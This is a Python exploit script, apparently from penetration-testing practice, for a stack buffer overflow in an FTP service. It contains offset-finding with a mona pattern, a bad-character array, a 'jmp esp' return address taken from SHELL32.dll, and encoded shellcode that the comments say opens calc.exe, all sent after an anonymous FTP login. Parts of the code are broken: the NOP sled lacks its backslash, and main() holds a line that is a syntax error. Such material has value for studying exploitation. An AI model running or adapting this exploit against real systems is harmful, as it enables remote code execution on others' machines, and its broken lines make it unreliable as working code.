from struct import pack
import socket, os, sys

#global variables
ip = '172.16.172.40'
port = 21
prefix = ""

# !mona pattern_create 420
pattern = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9"
# !mona pattern_offset findOffset() -> <34694133>
offset = 251

# fuzz buffer size

# get offset
def findOffset():
    sendData(pattern)# -> <34694133>

# find badchars
# babchars \x00\x0a\x0d
def sendArrayBytes():
    overflow = "A" * offset
    eip = "BBBB"
    arrayBytes = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
    buffer = overflow + eip + arrayBytes
    sendData(buffer)

def sendExploit():
    overflow = "A" * offset
    ### override de eip with the address of the esp to load our shellcode
    #
    # We need to load the shellcode of the esp 
    # To do that, we need that the eip point to an address with a "jmp esp" gadget
    #
    # we can search this operation from a loaded dll in memory without security protections
    # !mona modules
    #
    # we can search the hex name of a nasm operation with nasm_shell.rb metasploit module:
    # nasm> jmp esp -> ffe4
    #
    # now we need to search a \xff\xe4 gadget address in our previus non protected dll.
    # !mona find -s "xff\xe4" -m SHELL32.dll -> 0x7761a333
    #
    # finally we just put the address in little endian format becuase we are in a x86 windows environment
    # \x33\xa3\x61\x77 
    ###
    eip = "\x33\xa3\x61\x77"
    nops = "x90"*35
    # Shellcode that open the calc.exe as a POC
    buf =  ""
    buf += "\xdb\xdf\xbb\x2e\x70\x23\x51\xd9\x74\x24\xf4\x5f\x29"
    buf += "\xc9\xb1\x31\x31\x5f\x18\x83\xc7\x04\x03\x5f\x3a\x92"
    buf += "\xd6\xad\xaa\xd0\x19\x4e\x2a\xb5\x90\xab\x1b\xf5\xc7"
    buf += "\xb8\x0b\xc5\x8c\xed\xa7\xae\xc1\x05\x3c\xc2\xcd\x2a"
    buf += "\xf5\x69\x28\x04\x06\xc1\x08\x07\x84\x18\x5d\xe7\xb5"
    buf += "\xd2\x90\xe6\xf2\x0f\x58\xba\xab\x44\xcf\x2b\xd8\x11"
    buf += "\xcc\xc0\x92\xb4\x54\x34\x62\xb6\x75\xeb\xf9\xe1\x55"
    buf += "\x0d\x2e\x9a\xdf\x15\x33\xa7\x96\xae\x87\x53\x29\x67"
    buf += "\xd6\x9c\x86\x46\xd7\x6e\xd6\x8f\xdf\x90\xad\xf9\x1c"
    buf += "\x2c\xb6\x3d\x5f\xea\x33\xa6\xc7\x79\xe3\x02\xf6\xae"
    buf += "\x72\xc0\xf4\x1b\xf0\x8e\x18\x9d\xd5\xa4\x24\x16\xd8"
    buf += "\x6a\xad\x6c\xff\xae\xf6\x37\x9e\xf7\x52\x99\x9f\xe8"
    buf += "\x3d\x46\x3a\x62\xd3\x93\x37\x29\xb9\x62\xc5\x57\x8f"
    buf += "\x65\xd5\x57\xbf\x0d\xe4\xdc\x50\x49\xf9\x36\x15\xb5"
    buf += "\x1b\x93\x63\x5e\x82\x76\xce\x03\x35\xad\x0c\x3a\xb6"
    buf += "\x44\xec\xb9\xa6\x2c\xe9\x86\x60\xdc\x83\x97\x04\xe2"
    buf += "\x30\x97\x0c\x81\xd7\x0b\xcc\x68\x72\xac\x77\x75"
    
    payload = overflow + eip + nops + buf
    sendData(payload)

# send data
def sendData(data):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((ip, port))
            print(s.recv(1024))

            s.send(bytes('USER anonymous \r\n', "latin-1"))
            print(s.recv(1024))
            s.send(bytes('PASS anonymous \r\n', "latin-1"))
            print(s.recv(1024))
            s.send(bytes(data + '\r\n', "latin-1"))
            print(s.recv(1024))

            s.close()

    except:
        print("ERROR sending data {} bytes".format(len(data)))
        sys.exit(0)

# UTILS
def getArrayBytes():
    for x in range(1, 256):
        print("\\x" + "{:02x}".format(x), end='')
    print()

def main():
    #1.- findOffset()
    #2.- getArrayBytes()
    #3.- sendArrayBytes()
    4.- sendExploit()
if __name__ == "__main__":
    main()